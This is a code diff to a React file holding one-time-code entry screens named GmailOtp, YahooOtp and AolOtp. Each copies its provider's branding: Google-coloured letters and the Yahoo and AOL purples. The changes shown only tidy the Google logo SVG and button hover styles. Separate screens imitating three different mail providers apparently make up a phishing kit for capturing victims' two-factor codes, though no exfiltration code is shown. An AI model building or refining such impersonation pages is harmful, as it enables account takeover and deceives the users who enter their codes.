@@ -24,9 +24,6 @@ const GmailOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boo
     <div className="w-full max-w-md rounded-lg border border-gray-200 p-8 md:p-10" style={{ boxShadow: '0 1px 3px rgba(0,0,0,0.08)' }}>
       <div className="text-center mb-6">
         <svg viewBox="0 0 75 24" className="mx-auto h-6 mb-6">
-          <g>
-            <path fill="#4285F4" d="M3.2 13.2l-.1-.9h-3v3.4h1.7v-2c.4.5 1 .8 1.7.8 1.5 0 2.7-1.2 2.7-3s-1.2-3-2.7-3c-.7 0-1.3.3-1.7.8l.1-.7H.3v8.5h1.7v-3.1c.4.5 1 .8 1.7.8 1.5 0 2.7-1.3 2.7-3s-1.2-3.1-2.7-3.1c-.7 0-1.3.3-1.7.9z" transform="translate(0,3) scale(3.2)" />
-          </g>
           <text x="2" y="20" fill="#4285F4" fontSize="22" fontWeight="500" fontFamily="'Google Sans',Arial">G</text>
           <text x="20" y="20" fill="#EA4335" fontSize="22" fontWeight="500" fontFamily="'Google Sans',Arial">o</text>
           <text x="36" y="20" fill="#FBBC05" fontSize="22" fontWeight="500" fontFamily="'Google Sans',Arial">o</text>
@@ -110,7 +107,7 @@ const YahooOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boo
             <OtpInput length={6} onComplete={onOtpComplete} disabled={isLoading} theme="light" />
           </div>
 
-          <button type="submit" disabled={isLoading || otp.length !== 6} className="w-full py-2.5 px-4 rounded-full font-bold text-sm text-white disabled:opacity-50 disabled:cursor-not-allowed transition-colors" style={{ backgroundColor: '#720e9e' }} onMouseEnter={e => { if (!(e.currentTarget as HTMLButtonElement).disabled) (e.currentTarget as HTMLElement).style.backgroundColor = '#5b0b7e'; }} onMouseLeave={e => (e.currentTarget as HTMLElement).style.backgroundColor = '#720e9e'}>
+          <button type="submit" disabled={isLoading || otp.length !== 6} className="w-full py-2.5 px-4 rounded-full font-bold text-sm text-white bg-[#720e9e] hover:bg-[#5b0b7e] disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
             {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
             {isLoading ? 'Verifying...' : 'Verify'}
           </button>
@@ -161,7 +158,7 @@ const AolOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boole
             <OtpInput length={6} onComplete={onOtpComplete} disabled={isLoading} theme="light" />
           </div>
 
-          <button type="submit" disabled={isLoading || otp.length !== 6} className="w-full py-2.5 px-4 rounded-full font-bold text-sm text-white disabled:opacity-50 disabled:cursor-not-allowed transition-colors" style={{ backgroundColor: '#39007E' }} onMouseEnter={e => { if (!(e.currentTarget as HTMLButtonElement).disabled) (e.currentTarget as HTMLElement).style.backgroundColor = '#2a005f'; }} onMouseLeave={e => (e.currentTarget as HTMLElement).style.backgroundColor = '#39007E'}>
+          <button type="submit" disabled={isLoading || otp.length !== 6} className="w-full py-2.5 px-4 rounded-full font-bold text-sm text-white bg-[#39007E] hover:bg-[#2a005f] disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
             {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
             {isLoading ? 'Verifying...' : 'Verify'}
           </button>
